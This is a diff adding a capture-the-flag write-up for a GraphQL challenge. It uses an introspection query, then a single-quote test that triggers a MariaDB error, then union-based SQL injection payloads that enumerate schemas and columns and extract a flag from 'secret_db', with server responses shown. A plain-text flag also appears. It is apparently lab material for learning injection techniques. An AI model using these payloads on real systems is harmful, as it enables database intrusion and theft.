@@ -87,8 +87,43 @@ for i in range(100):
                print(x["data"]["HackerInSpace"][0]["hacker_value"],end="")
        except:pass
 
+Grql injection---->{y3s_y0u_can_1nj3ct_SQL_1n_gr@phql}
 
+The first step is to send an introspection query:
 
+{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
+By reviewing the result, we discover two query types:
+
+rocket : filter only by the rocket id.
+rockets: can filter by the name, country and is_active properties.
+When using the first query type, the server accepts sending the id as a string, so we can try to inject backend syntax such as single-quote character.
+{"query":"{rocket(id:\"1'\"){id,name,country}}"}
+
+The result of this query returns an SQL error, which assures that we can influence the SQL query at the backend:
+{"errors":[{"message":"ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1","locations":[{"line":1,"column":2}],"path":["rocket"]}],"data":{"rocket":null}}
+
+From this point the exploitation is a straight-forward union based SQL injection:
+
+discover the number of columns:
+{"query":"{rocket(id:\"1 order by 4--\"){id,name,country}}"}
+extract database names:
+Query:
+{"query":"{rocket(id:\"-1 union select  schema_name,2,3,4 FROM information_schema.schemata LIMIT 1 OFFSET 2;--\"){id}}"}
+
+Result:
+{"data":{"rocket":{"id":"secret_db"}}}
+extract column names:
+Query:
+{"query":"{rocket(id:\"-1 union select table_schema,table_name,column_name,4 FROM information_schema.columns where table_schema='secret_db' LIMIT 1 OFFSET 1;--\"){id,name,country}}"}
+
+Result:
+{"data":{"rocket":{"id":"secret_db","name":"flag","country":"value","is_active":4}}}
+extract flag:
+Query:
+{"query":"{rocket(id:\"-1 union select id,value,3,4 from secret_db.flag;--\"){id,name}}"}
+
+Result:
+{"data":{"rocket":{"id":"1","name":"RM{**************************"}}}
 
 
 
